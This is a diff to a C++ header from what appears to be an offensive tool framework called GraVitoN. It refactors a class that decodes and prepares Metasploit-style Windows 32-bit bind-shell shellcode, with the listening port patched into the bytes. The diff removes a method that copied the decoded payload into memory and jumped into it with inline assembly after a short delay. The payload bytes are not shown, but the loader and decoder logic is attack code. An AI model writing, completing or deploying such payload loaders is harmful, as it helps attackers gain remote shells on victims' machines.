@@ -24,15 +24,20 @@
 */
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-#ifndef _GVN_PAYLOAD_METER_W32B_KASPER_HEAD_
-#define _GVN_PAYLOAD_METER_W32B_KASPER_HEAD_
+#ifndef _GVN_Windows_MSF_Shell_Bind_32_Kasper_HEAD_
+#define _GVN_Windows_MSF_Shell_Bind_32_Kasper_HEAD_
 
-#include "../gvn_payload.hpp"
+#include <payload/payload.hpp>
+#include <utils/optparser.hpp>
 
 #include <cstdio>
 #include <cstdlib>
 
-using namespace GraVitoN;
+namespace GraVitoN
+{
+
+namespace Payload
+{
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
 /**
@@ -41,34 +46,36 @@ using namespace GraVitoN;
  * @see Payload_Sample
  *
  */
-class Payload_Meter_W32b_Kasper : public GraVitoN::Bin_Payload
+class Windows_MSF_Shell_Bind_32_Kasper : public Payload::Binary_Payload
 {
+private:
+    unsigned int port;
+
 protected:
 	virtual bool initPayload();
 	bool decode();
 	
 public:
-    Payload_Meter_W32b_Kasper();
-    virtual ~Payload_Meter_W32b_Kasper();
+    Windows_MSF_Shell_Bind_32_Kasper();
+    virtual ~Windows_MSF_Shell_Bind_32_Kasper();
 
-    virtual bool initialize ( const string &_options );
-    virtual bool run();
+    virtual bool initialize ( const unsigned int &bport);
 };
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_W32b_Kasper::Payload_Meter_W32b_Kasper()
+Windows_MSF_Shell_Bind_32_Kasper::Windows_MSF_Shell_Bind_32_Kasper()
 {
     jumper = _null_;
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-Payload_Meter_W32b_Kasper::~Payload_Meter_W32b_Kasper()
+Windows_MSF_Shell_Bind_32_Kasper::~Windows_MSF_Shell_Bind_32_Kasper()
 {
 }
 
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b_Kasper::decode()
+bool Windows_MSF_Shell_Bind_32_Kasper::decode()
 {
     int enc_size = payload_size;
     payload_size = 0;
@@ -99,9 +106,9 @@ bool Payload_Meter_W32b_Kasper::decode()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b_Kasper::initPayload()
+bool Windows_MSF_Shell_Bind_32_Kasper::initPayload()
 {
-	string hex_port = "1cbd"; // port=7357
+    string hex_port = Utils::OptParser::toHex(port);
 	
 	/**
      * windows/meterpreter/bind_tcp - 298 bytes (stage 1) \n
@@ -162,10 +169,7 @@ bool Payload_Meter_W32b_Kasper::initPayload()
 		;
 		
     int buf_len = 329*2;
-	
-	if( !OptParser::getValueAsHexString(options, "PORT", hex_port) )
-		hex_port = "1cbd"; // 7357
-	
+		
 	int pos = 13*30 + 10;
 	while( hex_port.length() < 4 )
 		hex_port = "0" + hex_port;
@@ -181,48 +185,24 @@ bool Payload_Meter_W32b_Kasper::initPayload()
 }
 
 //-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b_Kasper::initialize ( const string &_options )
+bool Windows_MSF_Shell_Bind_32_Kasper::initialize (const unsigned int &bport)
 {
-    options = _options;
+    port = bport;
 
 	/// Init memory
-    Logger::logIt ( "init payload... " );
+    Core::Logger::logIt ( "init payload... " );
     initPayload();
-    Logger::logItLn ( "done" );
+    Core::Logger::logItLn ( "done" );
 
 	/// Decode
-	Logger::logIt ( "decoding..." );
+    Core::Logger::logIt ( "decoding..." );
     decode();
-    Logger::logItLn ( "done" );
-
-	/// Set jumper address
-    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
-    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );
+    Core::Logger::logItLn ( "done" );
 
     return true;
 }
 
-//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
-bool Payload_Meter_W32b_Kasper::run()
-{
-    // A Little Delay!
-    int _delay = 222;
-    while ( _delay > 0 ) {
-        --_delay;
-    }
 
-    int useless_out = 0;
-    Logger::logItLn ( "Jumping..." );
-    asm (
-        "mov %1, %%ebx;"
-        "jmp *%%ebx;"
-        : "=r" ( useless_out )
-        : "r" ( jumper )
-        : "%ebx"
-    );
-    Logger::logItLn ( "call > done" );
-
-    return true;
 }
-
-#endif // _GVN_Payload_Meter_W32b_Kasper_HEAD_
+}
+#endif // _GVN_Windows_MSF_Shell_Bind_32_Kasper_HEAD_
